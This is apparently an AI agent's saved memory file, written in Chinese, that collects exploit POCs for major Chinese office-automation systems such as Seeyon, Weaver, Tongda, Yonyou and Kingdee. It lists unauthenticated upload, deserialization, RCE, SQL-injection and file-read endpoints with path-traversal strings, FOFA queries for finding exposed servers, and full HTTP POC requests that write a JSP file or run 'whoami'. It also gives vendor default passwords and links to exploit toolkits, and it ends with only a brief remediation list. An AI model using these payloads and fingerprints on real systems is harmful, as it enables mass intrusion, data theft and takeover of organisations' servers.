---
name: kb_oa_systems_poc_2026
description: 六大OA系统(泛微/致远/蓝凌/通达/用友/金蝶)漏洞POC合集 含FOFA指纹+利用接口+检测方式
metadata: 
  node_type: memory
  type: reference
  originSessionId: 5d675b98-bcc4-43f6-b8de-46635cd0836f
---

# 六大OA系统漏洞POC合集 (2026版)

## 1. 泛微 Weaver (e-cology / e-office)

### 文件上传→GetShell
| 漏洞 | 接口 | 认证 |
|------|------|------|
| KtreeUploadAction 任意上传 | `/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image` | 未授权 |
| weaver.common.Ctrl 上传 | `/weaver/weaver.common.Ctrl` (.css绕过) | 未授权 |
| e-office Init.php 上传 | `/e-office/Init.php` | 未授权 |
| e-office UploadFile.php 上传 | `/e-office/UploadFile.php` | 未授权 CNVD-2021-49104 |
| clusterupgrade 文件上传 | `/clusterupgrade` | 前台 |
| e-office portal 上传 | `/e-office/portal/attachment.jsp` | 需登录 CNVD-2024-47096 |

### RCE
| 漏洞 | 接口 | 编号 |
|------|------|------|
| BshServlet RCE | `/weaver/bsh.servlet.BshServlet/` | CNVD-2019-32204 |
| WorkflowServiceXml XStream反序列化 | `/services/WorkflowServiceXml` | XMLDecoder |
| Hessian反序列化 | `/e-cology/hessian/service` | CommonsCollections |
| H2 数据库 RCE | H2 Console相关 | CNVD-2024-36084 |

### 未授权/信息泄露
| 漏洞 | 接口 |
|------|------|
| ProcessOverRequestByXml 文件读取 | `/weaver/ProcessOverRequestByXml` |
| DBconfigReader 泄露 | `/mobile/DBconfigReader.jsp` |
| ofsLogin.jsp 任意登录 | `/mobile/plugin/1/ofsLogin.jsp` |
| getFileViewUrl SSRF | `/api/doc/mobile/fileview/getFileViewUrl` |

### SQL注入
- WorkflowCenterTreeData.jsp (Oracle, CNVD-2019-34241)
- BlogService /weaver/common/Ctrl (CNVD-2024-32680)

### FOFA
```
app="泛微-OA（e-cology）"
app="泛微-协同商务系统"
```

---

## 2. 致远 Seeyon

### 文件上传→RCE
| 漏洞 | 接口 | CVE/编号 |
|------|------|------|
| wpsAssistServlet 路径穿越 | `POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/x.jsp&fileId=2` | **CVE-2025-34040** 无需认证 |
| ajax.do 未授权上传 | `/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager` | CNVD-2021-01627 |
| fileUpload.do 上传绕过 | `/seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload` | XVE-2024-8166 |
| htmlofficeservlet 上传 | `/seeyon/htmlofficeservlet` | A8-V5/V6/V7 |

### 信息泄露
| 漏洞 | 接口 |
|------|------|
| status.jsp 监控页 | `/seeyon/management/status.jsp` 密码:WLCCYBD@SEEYON |
| Session 泄露 | `/seeyon/getSessionList.jsp` |
| 帆软目录遍历 | `/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../` |

### CVE-2025-34040 POC (最新)
```
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/Hello.jsp&fileId=2 HTTP/1.1
Content-Type: multipart/form-data; boundary=xxx
--xxx
Content-Disposition: form-data; name="upload"; filename="123.xls"
<% out.println("HelloWorld");%>
--xxx--
```
影响: V5.0~V8.0sp2 全系列

### FOFA
```
app="致远互联-OA"
title="致远A8-V5协同管理软件 V6.1sp1"
```

---

## 3. 蓝凌 Landray

### RCE
| 漏洞 | 路径 | 利用链 |
|------|------|------|
| sysUiComponent.do RCE | `/sys/ui/sys_ui_component/sysUiComponent.do` | replaceExtend 复制脚本→dataxml.jsp执行 |
| custom.jsp 命令执行 | `/sys/ui/extend/varkind/custom.jsp` POST `s_bean=ruleFormulaValidate&script=<cmd>` | 需带JSESSIONID |

### 文件上传
| 漏洞 | 路径 | 认证 |
|------|------|------|
| sysUiExtend.do 上传 | `/api///sys/ui/sys_ui_extend/sysUiExtend.do?method=upload` | 未授权 ZIP包上传 |
| EIS UploadPic.aspx | `POST /HR/Ajax/UploadPic.aspx?KeyID=111` | 前台 |

### 文件读取
- custom.jsp 任意文件读取: `var={"body":{"file":"file:///etc/passwd"}}` (CVE-2022-34924)
- sysUiComponent.do 路径遍历: `?method=delPreviewFile&directoryPath=../` (CVE-2024-11238)

### CVE列表
- CVE-2025-22214: SQL注入 /Message/fi_message_receiver.aspx?replyid=
- CVE-2024-11239: 路径遍历 /sys/common/import.do
- CVE-2022-34924: 任意文件读取 custom.jsp

### FOFA
```
app="Landray-OA系统"
```

---

## 4. 通达 Tongda

### 检测工具: TongdaScan_go (10个漏洞)
| ID | 漏洞 | 版本 |
|----|------|------|
| Td01 | get_contactlist.php 信息泄露 | v2014 |
| Td02 | video_file.php 任意下载 | v2017 |
| Td03 | action_upload.php 任意上传 | v2017 |
| Td04 | login_code.php 任意登录 | v2017/v11 |
| Td05 | swfupload_new.php SQL注入 | v11.5 |
| Td06 | report_bi.func.php SQL注入 | v11.6 |
| Td07 | api.ali.php 任意上传 | v11.8 |
| Td08 | gateway.php RFI | v11.8 |
| Td09 | print.php 删除auth.inc.php→RCE | v11.6 |
| Td10 | getdata 任意上传 | v11.10 |

### 2025最新: OfficeTask UDP RCE
- **端口**: UDP 2397
- **版本**: 13.2/13.3 最新版
- **原理**: UDP未授权接收 `EXEC_HTTP_TASK_0 \..\poc.php` 执行任意PHP

### 经典利用链: 上传+包含→RCE
1. 绕过认证: `/ispirit/im/upload.php` 设参数P绕过
2. 绕过后缀: `文件名.php.` (Windows特性)
3. 文件包含: `/ispirit/interface/gateway.php` json={"url":"/general/../../nginx/logs/oa.access.log"}

### FOFA
```
app="TDXK-通达OA"
title="通达OA"
```

---

## 5. 用友 Yonyou (NC/U8/Cloud/畅捷通)

### 2025高危
| 漏洞 | 接口 | 编号 |
|------|------|------|
| NCCloudGatewayServlet RCE | `/servlet/NCCloudGatewayServlet` | AVD-2025-1821638 |
| IPFxxFileService 文件上传 | `/servlet/IPFxxFileService` | AVD-2025-1818190 |
| FileManageServlet 反序列化 | 反序列化RCE | 黑白名单绕过 |

### 经典反序列化 (ysoserial利用)
- 用友NC反序列化-1/2/3
- 用友U8C反序列化-1/2
- 畅捷通T+ GetStoreWarehouseByStore反序列化

### 文件上传系列(15+接口)
NC: accept/uapim/mp/saveXmlToFileServlet/FileManager/saveImageServlet
NC Cloud: uploadChunk/importhttpscer
U8CRM: swfupload/getemaildata/crmtools
GRP-U8: UploadFileData/U8AppProxy
畅捷通T+: 文件上传-1/2
KSOA: ImageUpload/Attachment

### FOFA
```
app="用友-U8-Cloud"
app="yonyou-GRP-U8"
app="畅捷通-TPlus"
title="YONYOU NC"
body="ufida.ico"
```

---

## 6. 金蝶 Kingdee (云星空/EAS/Apusic)

### 云星空 Kingdee Cloud
| 漏洞 | 路径 | 类型 |
|------|------|------|
| ScpSupRegHandler 上传 | `/k3cloud/SRM/ScpSupRegHandler` multipart穿越→ashx | GetShell |
| K3Cloud 反序列化 | `/k3cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc` | BinaryFormatter |
| UserService 反序列化 | `/Kingdee.BOS.ServiceFacade.ServicesStub.User.UserService.SaveUserPassport.common.kdsvc` | 未授权 |

### K3Cloud RCE POC
```
POST /k3cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc
cmd: whoami
{"ap0":"<ysoserial payload>", "format":"3"}
```

### EAS
- easportal 文件上传 (2024-03)
- logo文件上传

### 天燕 Apusic (8个漏洞 2024-2025)
- deployApp 任意文件上传
- createDataSource/loadTree JNDI注入→RCE
- AdminService RCE
- V10.0 IIOP反序列化RCE

### FOFA
```
app="金蝶云星空-管理中心"
app="Kingdee-EAS"
```

---

## 7. 万户 Wanghu

### 漏洞列表 (11个)
| 漏洞 | 类型 | 接口 |
|------|------|------|
| 用户密码泄露 | 信息泄露 | — |
| fileUpload 文件上传 | 上传 | `/defaultroot/upload/fileUpload.controller` |
| officeserverservlet 上传 | 上传 | officeserverservlet |
| smartUpload 文件上传 | 上传 | smartUpload |
| OfficeServer 文件上传 | 上传 | OfficeServer |
| wpsservlet 文件上传 | 上传 | wpsservlet |
| senddocument 文件导入→RCE | RCE | senddocument |
| SOAP 文件写入 | RCE | SOAP接口 |
| SOAP创建文件写入 | RCE | SOAP接口 |
| DocumentEdit_unite.jsp SQL注入 | SQL注入 | DocumentEdit_unite.jsp |
| ezoffice 未授权访问 | 未授权 | `/evoInterfaceServlet` |

### FOFA
```
app="万户网络-ezOFFICE"
body="ezoffice"
```

---

## 8. 帆软 FineReport (常集成于OA)

| 漏洞 | 类型 |
|------|------|
| 任意文件读取 | 文件读取 (有bypass版本) |
| 任意文件覆盖 | 文件写入 |
| 未授权命令执行-1/2/3 | **未授权RCE** |
| channel 命令执行-1/2 | **RCE** (可注入内存马) |
| ReportServer SQL注入 | SQL注入 |
| 后台插件/主题文件上传 | 后台上传 |
| ReportServer 目录遍历 | 信息泄露 |

---

## 通用工具
- **OA-ALL-Exp-Tools**: github.com/Framework-vulnerability-tool/OA-ALL-Exp-Tools (30+ POC)
- **I-Wanna-Get-All**: 230+ POC 集成
- **POC-bomber**: github.com/tr0uble-mAker/POC-bomber
- **Exp-Tools**: github.com/cseroad/Exp-Tools

## 修复优先级
1. 补丁: 各厂商官网→service.seeyon.com / security.yonyou.com / 泛微社区
2. WAF: 阻断 .jsp/.jspx/.ashx 上传 + 路径穿越 `../`
3. 默认口令: admin/123456, admin/weaver123, admin/1, luor/26012345 必须改
